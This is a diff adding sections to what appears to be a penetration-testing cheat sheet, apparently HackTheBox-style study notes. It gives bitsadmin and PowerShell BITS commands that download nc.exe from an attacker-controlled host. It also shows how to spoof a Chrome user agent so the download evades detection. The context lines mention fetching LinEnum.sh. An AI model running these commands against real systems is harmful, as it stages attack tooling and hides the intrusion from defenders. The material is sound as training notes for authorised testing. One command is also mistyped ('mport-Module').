@@ -1533,3 +1533,41 @@ fopen("[url]", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = frea
     # verify upload 
     ls /var/www/uploads/SecretUploadDirectory/
 ```
+
+<br> 
+
+### Living Off the Land 
+```
+# The term "LOLBins" or "Living Off The Land Binaries" comes from binaries that an attacker can use to perform actions that were not origionally intended. LOLBins are also known as "misplaced trust binaries"
+  1. Windows Bins: https://lolbas-project.github.io/#
+  2. Unix Bins: https://gtfobins.github.io/
+
+# Bitsadmin Download Function (BITS)
+  1. bitsadmin /transfer wcb /priority foreground http://[ip]:[port]/nc.exe C:\Users\htb-student\Desktop\nc.exe
+
+  2. With Powershell
+    mport-Module bitstransfer; Start-BitsTransfer -Source "http://[ip]:[port]/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
+
+<br>
+
+### Detection & Evading Detection 
+```
+# Explaination of User-Agent String 
+  1. https://useragentstring.com/index.php
+
+# Changing User Agent
+  1. Invoke-WebRequest can change the user agent 
+    #List out User agents 
+    [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+  2. Select agent
+    $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+    Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+
+<br>
+<br>
+
+## Shells and Payloads
